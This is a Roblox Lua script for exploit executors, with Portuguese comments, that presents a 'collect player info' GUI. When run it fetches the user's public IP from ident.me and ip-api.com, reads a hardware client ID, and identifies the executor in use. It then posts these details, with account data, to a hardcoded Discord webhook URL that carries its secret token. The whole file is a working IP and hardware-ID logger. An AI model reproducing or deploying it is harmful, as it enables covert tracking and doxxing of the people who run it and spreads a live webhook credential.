local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local player = Players.LocalPlayer
local GuiService = game:GetService("StarterGui")

-- Criando a interface do usuário (GUI)
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = player.PlayerGui

-- Painel de texto para digitar o nome do jogador
local nameInput = Instance.new("TextBox")
nameInput.Parent = screenGui
nameInput.Size = UDim2.new(0, 400, 0, 50)
nameInput.Position = UDim2.new(0.5, -200, 0.5, -25)
nameInput.PlaceholderText = "Digite o nome do jogador"
nameInput.TextScaled = true

-- Botão para enviar o nome e coletar as informações
local submitButton = Instance.new("TextButton")
submitButton.Parent = screenGui
submitButton.Size = UDim2.new(0, 200, 0, 50)
submitButton.Position = UDim2.new(0.5, -100, 0.5, 30)
submitButton.Text = "Coletar Informações"
submitButton.TextScaled = true

-- Função para coletar informações sobre o jogador
local function getPlayerInfo(playerName)
    local targetPlayer = Players:FindFirstChild(playerName)
    if targetPlayer then
        local Userid = targetPlayer.UserId
        local DName = targetPlayer.DisplayName
        local Name = targetPlayer.Name
        local MembershipType = tostring(targetPlayer.MembershipType):sub(21)
        local AccountAge = targetPlayer.AccountAge
        local Country = game.LocalizationService.RobloxLocaleId
        local GetIp = game:HttpGet("https://v4.ident.me/")
        local GetData = game:HttpGet("http://ip-api.com/json")
        local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()

        -- Informações do jogo
        local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name

        -- Detectando Executor
        local function detectExecutor()
            local executor = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
                            or (secure_load and "Sentinel")
                            or (pebc_execute and "ProtoSmasher")
                            or (KRNL_LOADED and "Krnl")
                            or (is_sirhurt_closure and "SirHurt")
                            or (identifyexecutor():find("ScriptWare") and "Script-Ware")
                            or "Unsupported"
            return executor
        end

        -- Criando os dados para o Webhook
        local function createWebhookData()
            local webhookcheck = detectExecutor()
            
            local data = {
                ["avatar_url"] = "https://i.pinimg.com/564x/75/43/da/7543daab0a692385cca68245bf61e721.jpg",
                ["content"] = "",
                ["embeds"] = {
                    {
                        ["author"] = {
                            ["name"] = "Informações do Jogador",
                            ["url"] = "https://roblox.com",
                        },
                        ["description"] = string.format(
                            "__[Player Info](https://www.roblox.com/users/%d)__" .. 
                            " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
                            "\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s" ..
                            "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
                            "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
                            "\n\n**Data:**```%s```\n\n**JobId:**```%s```",
                            Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
                            tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
                            game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
                            GetData, "JobIdExample"
                        ),
                        ["type"] = "rich",
                        ["color"] = tonumber("0xFFD700"),
                        ["thumbnail"] = {
                            ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"
                        },
                    }
                }
            }
            return HttpService:JSONEncode(data)
        end

        -- Função para enviar o Webhook
        local function sendWebhook(webhookUrl, data)
            local headers = {
                ["content-type"] = "application/json"
            }

            local request = http_request or request or HttpPost or syn.request
            local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
            request(abcdef)
        end

        -- Seu Webhook
        local webhookUrl = "https://discord.com/api/webhooks/1331661006677737564/_vQxIjy8Yh8JwKdBXEWwlIS3JsUFyEb3-_CSi92wWDiDpH6NNjpERGdXoMiSWZQJ62aN"
        local webhookData = createWebhookData()

        -- Enviar os dados para o Webhook
        sendWebhook(webhookUrl, webhookData)
    else
        print("Jogador não encontrado.")
    end
end

-- Função para tratar o evento de clique no botão
submitButton.MouseButton1Click:Connect(function()
    local playerName = nameInput.Text
    if playerName and playerName ~= "" then
        getPlayerInfo(playerName)
    else
        print("Nome de jogador inválido.")
    end
end)
